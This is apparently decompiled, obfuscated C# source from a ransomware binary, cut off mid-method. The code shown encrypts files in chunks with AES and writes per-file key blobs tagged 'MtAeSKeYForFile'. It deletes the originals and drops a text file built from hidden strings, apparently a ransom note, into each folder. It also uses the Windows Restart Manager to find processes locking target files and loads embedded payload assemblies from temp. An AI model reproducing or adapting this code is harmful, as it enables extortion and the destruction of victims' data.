using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Shared.ReportHelper;
using ns0;
using ns2;
using ns4;
using ns5;
using ns6;
using ns8;

namespace ns1;

internal sealed class Class32
{
	static void smethod_0(int int_0, Class21.Class31 class31_0)
	{
		class31_0.byte_0[class31_0.int_1++] = (byte)int_0;
		class31_0.byte_0[class31_0.int_1++] = (byte)(int_0 >> 8);
	}

	static byte[] smethod_1(string string_0, byte[] byte_0)
	{
		byte[] array = null;
		using HMACSHA256 hMACSHA = new HMACSHA256(byte_0);
		using FileStream inputStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.Read);
		return hMACSHA.ComputeHash(inputStream);
	}

	static void smethod_2(Class21.Class30 class30_0)
	{
		class30_0.int_10 = (class30_0.byte_0[class30_0.int_14] << 5) ^ class30_0.byte_0[class30_0.int_14 + 1];
	}

	unsafe static bool smethod_3(Class21.Class22 class22_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class32.smethod_89(class22_0.class24_0);
		while (num >= 258)
		{
			*(int*)ptr = class22_0.int_17;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class32.smethod_33(class22_0.class25_0, class22_0.class23_0)) & -256) == 0)
				{
					Class32.smethod_23(class22_0.class24_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class22_0.int_19 = Class21.Class22.int_0[num2 - 257];
					class22_0.int_18 = Class21.Class22.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class22_0.class25_1 = null;
				class22_0.class25_0 = null;
				class22_0.int_17 = 2;
				return true;
			}
			case 8:
				if (class22_0.int_18 > 0)
				{
					class22_0.int_17 = 8;
					*(int*)((byte*)ptr + 4) = Class32.smethod_70(class22_0.class23_0, class22_0.int_18);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class32.smethod_94(class22_0.class23_0, class22_0.int_18);
					class22_0.int_19 += *(int*)((byte*)ptr + 4);
				}
				class22_0.int_17 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class32.smethod_33(class22_0.class25_1, class22_0.class23_0);
				if (num2 >= 0)
				{
					class22_0.int_20 = Class21.Class22.int_2[num2];
					class22_0.int_18 = Class21.Class22.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class22_0.int_18 > 0)
				{
					class22_0.int_17 = 10;
					*(int*)((byte*)ptr + 8) = Class32.smethod_70(class22_0.class23_0, class22_0.int_18);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class32.smethod_94(class22_0.class23_0, class22_0.int_18);
					class22_0.int_20 += *(int*)((byte*)ptr + 8);
				}
				Class32.smethod_49(class22_0.class24_0, class22_0.int_19, class22_0.int_20);
				num -= class22_0.int_19;
				class22_0.int_17 = 7;
				break;
			}
		}
		return true;
	}

	unsafe static List<Process> smethod_4(string string_0)
	{
		void* ptr = stackalloc byte[24];
		string string_ = Guid.NewGuid().ToString();
		List<Process> result = new List<Process>();
		*(int*)((byte*)ptr + 4) = Class32.RmStartSession(out *(uint*)ptr, 0, string_);
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			throw new Exception("Could not begin restart session.  Unable to determine file locker.");
		}
		try
		{
			*(int*)((byte*)ptr + 8) = 0;
			*(int*)((byte*)ptr + 12) = 0;
			*(int*)((byte*)ptr + 16) = 0;
			string[] array = new string[1] { string_0 };
			*(int*)((byte*)ptr + 4) = Class32.RmRegisterResources(*(uint*)ptr, (uint)array.Length, array, 0u, (Class1.Struct0[])null, 0u, (string[])null);
			if (*(int*)((byte*)ptr + 4) != 0)
			{
				throw new Exception("Could not register resource.");
			}
			*(int*)((byte*)ptr + 4) = Class32.RmGetList(*(uint*)ptr, out *(uint*)((byte*)ptr + 8), ref *(uint*)((byte*)ptr + 12), (Class1.Struct1[])null, ref *(uint*)((byte*)ptr + 16));
			if (*(int*)((byte*)ptr + 4) == 234)
			{
				Class1.Struct1[] array2 = new Class1.Struct1[*(uint*)((byte*)ptr + 8)];
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
				if (Class32.RmGetList(*(uint*)ptr, out *(uint*)((byte*)ptr + 8), ref *(uint*)((byte*)ptr + 12), array2, ref *(uint*)((byte*)ptr + 16)) != 0)
				{
					throw new Exception("Could not list processes locking resource.");
				}
				result = new List<Process>(*(int*)((byte*)ptr + 12));
				*(int*)((byte*)ptr + 20) = 0;
				while (*(int*)((byte*)ptr + 20) < (uint)(*(int*)((byte*)ptr + 12)))
				{
					try
					{
						result.Add(Process.GetProcessById(array2[*(int*)((byte*)ptr + 20)].struct0_0.int_0));
					}
					catch (ArgumentException)
					{
					}
					(*(int*)((byte*)ptr + 20))++;
				}
				return result;
			}
			if (*(int*)((byte*)ptr + 4) != 0)
			{
				throw new Exception("Could not list processes locking resource. Failed to get size of result.");
			}
			return result;
		}
		finally
		{
			Class32.RmEndSession(*(uint*)ptr);
		}
	}

	static bool smethod_5(Class21.Class30 class30_0)
	{
		return class30_0.int_18 == class30_0.int_17;
	}

	unsafe static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		void* ptr = stackalloc byte[16];
		Class6.Struct2 @struct = new Class6.Struct2(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezg4ZmMyZDE4LTQyMmQtNGU4My1hZThkLTNkOWUyYzk5NGQzZX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{f7cb256f-2b93-426e-802f-fe87da1d9c06},ezg4ZmMyZDE4LTQyMmQtNGU4My1hZThkLTNkOWUyYzk5NGQzZX0=,[z]{f7cb256f-2b93-426e-802f-fe87da1d9c06}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class6.dictionary_0)
			{
				if (Class6.dictionary_0.ContainsKey(text2))
				{
					return Class6.dictionary_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (flag)
					{
						array2 = Class32.smethod_103(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class32.MoveFileEx(text5, (string)null, 4);
								Class32.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class6.dictionary_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static string smethod_7(string string_0, string string_1)
	{
		string path = Path.GetFileNameWithoutExtension(string_0) + string_1;
		return Path.Combine(Path.GetDirectoryName(string_0), path);
	}

	unsafe static void smethod_8(Class21.Class28.Class29 class29_0, Class21.Class28.Class29 class29_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class29_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class29_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class32.smethod_45(class29_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class29_1.int_1 && *(int*)((byte*)ptr + 8) == class29_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class32.smethod_45(class29_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class32.smethod_45(class29_0, 16);
				Class32.smethod_93(class29_1.class28_0.class31_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class32.smethod_45(class29_0, 17);
				Class32.smethod_93(class29_1.class28_0.class31_0, num - 3, 3);
			}
			else
			{
				Class32.smethod_45(class29_0, 18);
				Class32.smethod_93(class29_1.class28_0.class31_0, num - 11, 7);
			}
		}
	}

	static string smethod_9(Version version_0)
	{
		return $"Microsoft Windows {version_0.Major}.{version_0.Minor}.{version_0.Build}.{version_0.Revision}";
	}

	unsafe static void smethod_10(Class21.Class28 class28_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class28_0.int_9)
		{
			*(int*)((byte*)ptr + 4) = class28_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class28_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class32.smethod_68(class28_0, *(int*)((byte*)ptr + 4));
				Class32.smethod_45(class28_0.class29_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class32.smethod_93(class28_0.class31_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class32.smethod_40(class28_0, num);
				Class32.smethod_45(class28_0.class29_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class32.smethod_93(class28_0.class31_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class32.smethod_45(class28_0.class29_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class32.smethod_45(class28_0.class29_0, 256);
	}

	static Version smethod_11(Version version_0)
	{
		return OsInformation.smethod_2(OsInformation.smethod_1(), version_0);
	}

	static Class15 smethod_12(UIntPtr uintptr_0, Enum5 enum5_0, Enum3 enum3_0, string string_0, out Enum4 enum4_0)
	{
		return Class18.OpenKey(uintptr_0, enum5_0, enum3_0, string_0, out enum4_0);
	}

	unsafe static void smethod_13(byte[] byte_0, byte[] byte_1, byte[] byte_2, string string_0, string string_1, string string_2)
	{
		void* ptr = stackalloc byte[13];
		FileInfo fileInfo = new FileInfo(string_0);
		byte[] byte_3 = new byte[Class0.int_1];
		Class32.smethod_99(byte_3, string_2);
		((byte*)ptr)[12] = 1;
		Class0.smethod_0(string_0);
		*(long*)ptr = 0L;
		while (*(long*)ptr < fileInfo.Length / Class0.int_0 + 1L)
		{
			byte[] src = Class32.smethod_69(string_0, *(long*)ptr * Class0.int_0, out *(int*)((byte*)ptr + 8));
			byte[] array = new byte[*(int*)((byte*)ptr + 8)];
			Buffer.BlockCopy(src, 0, array, 0, *(int*)((byte*)ptr + 8));
			if (*(int*)((byte*)ptr + 8) > 0)
			{
				byte[] byte_4 = Class32.smethod_20(byte_0, array, byte_1);
				((byte*)ptr)[12] = (Class32.smethod_99(byte_4, string_2) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[12] == 0)
				{
					break;
				}
			}
			(*(long*)ptr)++;
		}
		if (((byte*)ptr)[12] == 0)
		{
			return;
		}
		try
		{
			byte[] inArray = Class32.smethod_1(string_2, byte_2);
			string text = Convert.ToBase64String(Class32.smethod_80(byte_1, string_1));
			string text2 = Convert.ToBase64String(Class32.smethod_80(byte_0, string_1));
			string text3 = Convert.ToBase64String(inArray);
			string text4 = Convert.ToBase64String(Class32.smethod_80(byte_2, string_1));
			byte[] byte_5 = Class32.smethod_90("<MtAeSKeYForFile>" + Class0.string_0 + "<Key>" + text + "</Key>" + Class0.string_0 + "<IV>" + text2 + "</IV>" + Class0.string_0 + "<Value>" + text3 + "</Value>" + Class0.string_0 + "<EncryptedKey>" + text4 + "</EncryptedKey>" + Class0.string_0 + "<OriginalFileLength>" + fileInfo.Length + "</OriginalFileLength>" + Class0.string_0 + "</MtAeSKeYForFile>");
			Class32.smethod_28(byte_5, string_2);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Key is not correct format : " + ex.Message);
			if (File.Exists(string_2))
			{
				File.Delete(string_2);
			}
		}
	}

	unsafe static void smethod_14(string string_0)
	{
		void* ptr = stackalloc byte[16];
		FileInfo fileInfo = new FileInfo(string_0);
		try
		{
			*(long*)ptr = new DriveInfo(string_0).AvailableFreeSpace;
			*(long*)((byte*)ptr + 8) = fileInfo.Length;
			if (*(long*)((byte*)ptr + 8) >= *(long*)ptr)
			{
				return;
			}
			if (new FileInfo(string_0).Length > 0L)
			{
				if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6))
				{
					if (new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6).Length <= *(long*)((byte*)ptr + 8))
					{
						File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6);
						Class32.smethod_71(string_0, Class2.string_1);
						try
						{
							File.WriteAllText(fileInfo.DirectoryName + "\\" + Class2.string_3 + Class2.string_4, Class32.smethod_54(Class2.string_7));
						}
						catch (Exception)
						{
						}
					}
				}
				else
				{
					Class32.smethod_71(string_0, Class2.string_1);
					try
					{
						File.WriteAllText(fileInfo.DirectoryName + "\\" + Class2.string_3 + Class2.string_4, Class32.smethod_54(Class2.string_7));
					}
					catch (Exception)
					{
					}
				}
			}
			if (File.Exists(string_0) && new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6).Length > *(long*)((byte*)ptr + 8))
			{
				File.Delete(string_0);
			}
		}
		catch (Exception)
		{
			if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6))
			{
				File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + Class2.string_6);
			}
		}
	}

	static void smethod_15(int int_0, Class21.Class31 class31_0, byte[] byte_0, int int_1)
	{
		Array.Copy(byte_0, int_1, class31_0.byte_0, class31_0.int_1, int_0);
		class31_0.int_1 += int_0;
	}

	static bool smethod_16(string string_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	static void smethod_17()
	{
		Class8.smethod_0();
	}

	unsafe static int smethod_18(Class21.Class24 class24_0, Class21.Class23 class23_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class24_0.int_3), class23_0.AvailableBytes);
		*(int*)((byte*)ptr + 4) = 32768 - class24_0.int_2;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class32.smethod_58(class23_0, class24_0.byte_0, class24_0.int_2, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class32.smethod_58(class23_0, class24_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class32.smethod_58(class23_0, class24_0.byte_0, class24_0.int_2, int_0);
		}
		class24_0.int_2 = (class24_0.int_2 + *(int*)ptr) & 0x7FFF;
		class24_0.int_3 += *(int*)ptr;
		return *(int*)ptr;
	}

	static string smethod_19(string string_0, string string_1, string string_2, string string_3)
	{
		byte[] byte_ = Class32.smethod_95(64);
		byte[] byte_2 = Class32.smethod_95(16);
		byte[] byte_3 = Class32.smethod_95(16);
		Class32.smethod_13(byte_3, byte_2, byte_, string_2, string_1, string_0);
		return null;
	}

	static byte[] smethod_20(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		if (byte_1 != null && byte_1.Length != 0)
		{
			if (byte_2 != null && byte_2.Length != 0)
			{
				if (byte_0 != null && byte_0.Length != 0)
				{
					using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
					{
						rijndaelManaged.KeySize = 128;
						rijndaelManaged.FeedbackSize = 8;
						rijndaelManaged.Key = byte_2;
						rijndaelManaged.IV = byte_0;
						rijndaelManaged.Padding = PaddingMode.Zeros;
						ICryptoTransform transform = rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV);
						using MemoryStream memoryStream = new MemoryStream();
						byte[] result;
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
						{
							cryptoStream.Write(byte_1, 0, byte_1.Length);
							cryptoStream.FlushFinalBlock();
							result = memoryStream.ToArray();
							cryptoStream.Close();
						}
						memoryStream.Close();
						return result;
					}
				}
				throw new ArgumentNullException("IV");
			}
			throw new ArgumentNullException("Key");
		}
		throw new ArgumentNullException("plainText");
	}

	static bool smethod_21(Class21.Class28 class28_0)
	{
		return class28_0.int_9 >= 16384;
	}

	static Enum4 smethod_22(ref object object_0, string string_0, [Out] string string_1)
	{
		object_0 = null;
		try
		{
			Enum4 enum4_;
			using Class15 @class = Class32.smethod_12(Class14.uintptr_2, Enum5.const_0, Enum3.const_0, string_0, out enum4_);
			switch (enum4_)
			{
			case Enum4.const_1:
				return Enum4.const_1;
			default:
				return Enum4.const_0;
			case Enum4.const_2:
				object_0 = @class.vmethod_0(string_1);
				break;
			}
		}
		catch
		{
			return Enum4.const_0;
		}
		return Enum4.const_2;
	}

	static void smethod_23(Class21.Class24 class24_0, int int_0)
	{
		if (class24_0.int_3++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class24_0.byte_0[class24_0.int_2++] = (byte)int_0;
		class24_0.int_2 &= 32767;
	}

	unsafe static int smethod_24(int int_0, byte[] byte_0, int int_1, Class21.Class24 class24_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class24_0.int_2;
		if (int_0 > class24_0.int_3)
		{
			int_0 = class24_0.int_3;
		}
		else
		{
			*(int*)ptr = (class24_0.int_2 - class24_0.int_3 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class24_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class24_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class24_0.int_3 -= *(int*)((byte*)ptr + 4);
		if (class24_0.int_3 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	unsafe static bool smethod_25(Class21.Class22 class22_0)
	{
		void* ptr = stackalloc byte[8];
		switch (class22_0.int_17)
		{
		case 2:
			if (class22_0.bool_0)
			{
				class22_0.int_17 = 12;
				return false;
			}
			*(int*)ptr = Class32.smethod_70(class22_0.class23_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class32.smethod_94(class22_0.class23_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class22_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class32.smethod_42(class22_0.class23_0);
				class22_0.int_17 = 3;
				break;
			case 1:
				class22_0.class25_0 = Class21.Class25.class25_0;
				class22_0.class25_1 = Class21.Class25.class25_1;
				class22_0.int_17 = 7;
				break;
			case 2:
				class22_0.class26_0 = new Class21.Class26();
				class22_0.int_17 = 6;
				break;
			}
			return true;
		case 3:
			if ((class22_0.int_21 = Class32.smethod_70(class22_0.class23_0, 16)) < 0)
			{
				return false;
			}
			Class32.smethod_94(class22_0.class23_0, 16);
			class22_0.int_17 = 4;
			goto case 4;
		case 4:
			if (Class32.smethod_70(class22_0.class23_0, 16) < 0)
			{
				return false;
			}
			Class32.smethod_94(class22_0.class23_0, 16);
			class22_0.int_17 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 4) = Class32.smethod_18(class22_0.class24_0, class22_0.class23_0, class22_0.int_21);
			class22_0.int_21 -= *(int*)((byte*)ptr + 4);
			if (class22_0.int_21 == 0)
			{
				class22_0.int_17 = 2;
				return true;
			}
			return !class22_0.class23_0.IsNeedingInput;
		case 6:
			if (!Class32.smethod_39(class22_0.class26_0, class22_0.class23_0))
			{
				return false;
			}
			class22_0.class25_0 = Class32.smethod_48(class22_0.class26_0);
			class22_0.class25_1 = Class32.smethod_30(class22_0.class26_0);
			class22_0.int_17 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class32.smethod_3(class22_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_26()
	{
		try
		{
			Class10.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static byte[] smethod_27(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class32.smethod_102(byte_0, byte_2, byte_1, 3);
	}

	static bool smethod_28(byte[] byte_0, string string_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.OpenOrCreate, FileAccess.Write);
		try
		{
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Close();
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception caught in process: {0}", ex.ToString());
			fileStream.Close();
			if (File.Exists(string_0))
			{
				File.Delete(string_0);
			}
		}
		return false;
	}

	unsafe static void smethod_29(Class21.Class28.Class29 class29_0)
	{
		void* ptr = stackalloc byte[32];
		*(int*)ptr = class29_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class29_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class29_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class29_0.int_1 = Math.Max(num2 + 1, class29_0.int_0);
		int num6 = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num7 = num6;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < num)
		{
			*(int*)((byte*)ptr + 16) = array[*(int*)((byte*)ptr + 12)];
			array2[2 * *(int*)((byte*)ptr + 12)] = *(int*)((byte*)ptr + 16);
			array2[2 * *(int*)((byte*)ptr + 12) + 1] = -1;
			array3[*(int*)((byte*)ptr + 12)] = class29_0.short_0[*(int*)((byte*)ptr + 16)] << 8;
			array[*(int*)((byte*)ptr + 12)] = *(int*)((byte*)ptr + 12);
			(*(int*)((byte*)ptr + 12))++;
		}
		do
		{
			*(int*)((byte*)ptr + 20) = array[0];
			int num8 = array[--num];
			int num9 = 0;
			int num10;
			for (num10 = 1; num10 < num; num10 = num10 * 2 + 1)
			{
				if (num10 + 1 < num && array3[array[num10]] > array3[array[num10 + 1]])
				{
					num10++;
				}
				array[num9] = array[num10];
				num9 = num10;
			}
			int num11 = array3[num8];
			while ((num10 = num9) > 0 && array3[array[num9 = (num10 - 1) / 2]] > num11)
			{
				array[num10] = array[num9];
			}
			array[num10] = num8;
			*(int*)((byte*)ptr + 24) = array[0];
			num8 = num7++;
			array2[2 * num8] = *(int*)((byte*)ptr + 20);
			array2[2 * num8 + 1] = *(int*)((byte*)ptr + 24);
			*(int*)((byte*)ptr + 28) = Math.Min(array3[*(int*)((byte*)ptr + 20)] & 0xFF, array3[*(int*)((byte*)ptr + 24)] & 0xFF);
			num11 = (array3[num8] = array3[*(int*)((byte*)ptr + 20)] + array3[*(int*)((byte*)ptr + 24)] - *(int*)((byte*)ptr + 28) + 1);
			num9 = 0;
			for (num10 = 1; num10 < num; num10 = num9 * 2 + 1)
			{
				if (num10 + 1 < num && array3[array[num10]] > array3[array[num10 + 1]])
				{
					num10++;
				}
				array[num9] = array[num10];
				num9 = num10;
			}
			while ((num10 = num9) > 0 && array3[array[num9 = (num10 - 1) / 2]] > num11)
			{
				array[num10] = array[num9];
			}
			array[num10] = num8;
		}
		while (num > 1);
		Class32.smethod_88(class29_0, array2);
	}

	static Class21.Class25 smethod_30(Class21.Class26 class26_0)
	{
		byte[] array = new byte[class26_0.int_10];
		Array.Copy(class26_0.byte_1, class26_0.int_9, array, 0, class26_0.int_10);
		return new Class21.Class25(array);
	}

	static void smethod_31(int int_0, bool bool_0, int int_1, Class21.Class28 class28_0, byte[] byte_0)
	{
		Class32.smethod_93(class28_0.class31_0, bool_0 ? 1 : 0, 3);
		Class32.smethod_108(class28_0.class31_0);
		Class32.smethod_0(int_1, class28_0.class31_0);
		Class32.smethod_0(~int_1, class28_0.class31_0);
		Class32.smethod_15(int_1, class28_0.class31_0, byte_0, int_0);
		Class32.smethod_32(class28_0);
	}

	static void smethod_32(Class21.Class28 class28_0)
	{
		class28_0.int_9 = 0;
		class28_0.int_10 = 0;
	}

	unsafe static int smethod_33(Class21.Class25 class25_0, Class21.Class23 class23_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class32.smethod_70(class23_0, 9)) >= 0)
		{
			if ((num2 = class25_0.short_0[num]) >= 0)
			{
				Class32.smethod_94(class23_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class32.smethod_70(class23_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class25_0.short_0[*(int*)ptr | (num >> 9)];
				Class32.smethod_94(class23_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class23_0.int_2;
			num = Class32.smethod_70(class23_0, *(int*)((byte*)ptr + 8));
			num2 = class25_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class32.smethod_94(class23_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class23_0.int_2;
		num = Class32.smethod_70(class23_0, *(int*)((byte*)ptr + 12));
		num2 = class25_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class32.smethod_94(class23_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
	static extern int RmStartSession(out uint uint_0, int int_0, string string_0);

	unsafe static bool smethod_34(int int_0, Class21.Class30 class30_0)
	{
		void* ptr = stackalloc byte[22];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = class30_0.short_1;
		int int_ = class30_0.int_14;
		*(int*)((byte*)ptr + 4) = class30_0.int_14 + class30_0.int_12;
		*(int*)((byte*)ptr + 8) = Math.Max(class30_0.int_12, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(class30_0.int_14 - 32506, 0);
		*(int*)((byte*)ptr + 16) = class30_0.int_14 + 258 - 1;
